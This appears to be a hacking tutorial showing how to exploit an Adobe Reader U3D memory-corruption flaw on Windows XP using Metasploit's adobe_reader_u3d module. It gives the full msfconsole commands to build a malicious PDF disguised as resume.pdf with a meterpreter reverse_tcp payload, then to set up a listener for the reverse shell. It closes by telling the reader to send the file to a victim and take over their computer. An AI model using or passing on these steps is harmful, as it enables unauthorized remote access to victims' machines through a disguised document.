Hack Windows XP using Adobe Reader U3D Memory Corruption Vulnerability

This module exploits vulnerability in the U3D handling within versions 9.x through 9.4.6 and 10 through to 10.1.1 of Adobe Reader. The vulnerability is due to the use of uninitialized memory. Arbitrary code execution is achieved by embedding specially crafted U3D data into a PDF document. A heap spray via JavaScript is used in order to ensure that the memory used by the invalid pointer issue is controlled.
Adobe Reader 9.4.0
Windows XP SP2
Attacker: Backtrack 5
Victim PC: Windows XP
Open backtrack terminal type msfconsole

Now type use exploit/windows/fileformat/adobe_reader_u3d
Msf exploit (adobe_reader_u3d)>set payload windows/meterpreter/reverse_tcp
Msf exploit (adobe_reader_u3d)>set lhost 192.168.1.2 (IP of Local Host)
Msf exploit (adobe_reader_u3d)>set filename resume.pdf
Msf exploit (adobe_reader_u3d)>exploit

After we successfully generate the malicious PDF File, it will stored on your local computer
/root/.msf4/local/resume.pdf

Now we need to set up a listener to handle reverse connection sent by victim when the exploit successfully executed.
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.1.2
exploit 
Now send your resume.pdf files to victim, as soon as they download and open it. Now you can access meterpreter shell on victim computer.
